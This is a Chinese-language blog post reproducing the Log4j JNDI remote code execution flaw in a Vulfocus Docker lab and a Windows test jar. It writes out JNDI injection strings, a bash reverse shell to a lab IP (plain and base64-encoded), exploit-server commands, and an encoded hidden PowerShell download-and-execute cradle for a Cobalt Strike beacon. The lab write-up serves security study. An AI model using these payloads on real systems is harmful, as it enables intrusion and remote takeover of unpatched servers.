---
title: Apache Log4J漏洞复现
date: 2021-12-11 15:56:08
categories: 漏洞复现
tags: RCE
---

#### 简介

Log4j 是一款开源 的Java 日志记录工具，漏洞是由Log4j 的lookup功能造成的，该功能允许开发人员通过一些协议读取加载远程环境中的配置，并未对输入进行效验，导致攻击者可以通过加载自己构造的恶意类达到代码执行的目的。但此漏洞在实际环境中要成功利用貌似还跟java版本等因素有关。

<!--more-->

**受影响产品包括但不限于**

* Spring-Boot-strater-log4j2
* Apache Struts2
* Apache Solr
* Apache Flink
* Apache Druid
* ElasticSearch
* flume
* dubbo
* Redis
* logstash
* kafka

#### 漏洞复现

##### 1. 漏洞检测

本次漏洞复现采用Vulfocus靶场，docker部署

` docker pull vulfocus/log4j2-rce-2021-12-09:latest`

`docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest`

nc监听或者dnslog

`nc -lvp 4444`

发送payload：`${jndi:ldap://192.168.1.16:4444}`

<img src="https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-11.png" style="zoom: 67%;" />

nc收到请求，证明存在漏洞

![](https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-22.png)

##### 2.漏洞利用

###### Linux反弹shell

1.利用工具:[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](https://github.com/bkfish/Apache-Log4j-Learning/blob/main/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar)

2.反弹shell

`bash -i >& /dev/tcp/192.168.1.16/4444 0>&1`

base64编码:[https://www.jackson-t.ca/runtime-exec-payloads.html/](https://www.jackson-t.ca/runtime-exec-payloads.html/)

![](https://cdn.laohuan.art/Snipaste_2021-12-11_11-28-52.png)

得到编码后的反弹脚本

`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTYvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}`

3.nc监听

`nc -lvp 4444`

4.使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar开启监听

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTYvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i} " -A 192.168.1.16`

5.发送paylaod，由于此靶场是Spring-Boot-strater-log4j2搭建环境，所以采用此payload,不同java版本选择相应相应的监听规则。

`${jndi://rmi://192.168.1.16:1099/whcpug}`，

6.成功收到shell

<img src="https://cdn.laohuan.art/Snipaste_2021-12-11_11-29-57.png"  />

###### Windows cs 上线

windows使用[漏洞环境](https://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ)分享的靶场，已将漏洞环境编译为jar包。

1.首先测试是否能正常执行命令，弹出计算器作为示例

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 192.168.1.16`

![](https://cdn.laohuan.art/Snipaste_2021-12-11_12-21-19.png)

2.使用靶场环境发送paylaod,成功弹出计算器

`java -jar LogTest.jar ${jndi:ldap://192.168.1.16:1389/arvhzz}`

![](https://cdn.laohuan.art/Snipaste_2021-12-11_12-21-38.png)

3.cs生成powershell上线代码，并bash64编码

![](https://cdn.laohuan.art/Snipaste_2021-12-11_14-30-05.png)

4.使用工具开启监听

```powershell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA2ADoAOAAwAC8AYQAnACkAKQAiAA==" -A 192.168.1.16
```

5.发送paylaod

`java -jar LogTest.jar  ${jndi:ldap://192.168.1.16:1389/kmelx9}`

![](https://cdn.laohuan.art/Snipaste_2021-12-11_14-29-43.png)

6.cs成功上线

![](https://cdn.laohuan.art/Snipaste_2021-12-11_14-29-14.png)

#### 相关漏洞检测工具

* [https://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2](https://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2)
* https://github.com/tangxiaofeng7/BurpLog4j2Scan
* [Log4j2 Vuln Detector (chaitin.cn)](https://log4j2-detector.chaitin.cn/)

#### 参考链接

1. [https://github.com/fengxuangit/log4j_vuln](https://github.com/fengxuangit/log4j_vuln)
2. [https://github.com/bkfish/Apache-Log4j-Learning](https://github.com/bkfish/Apache-Log4j-Learning)
3. [log4j漏洞复现环境分享 (qq.com)](https://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ)
4. [Log4J 漏洞复现+漏洞靶场 (qq.com)](https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ)

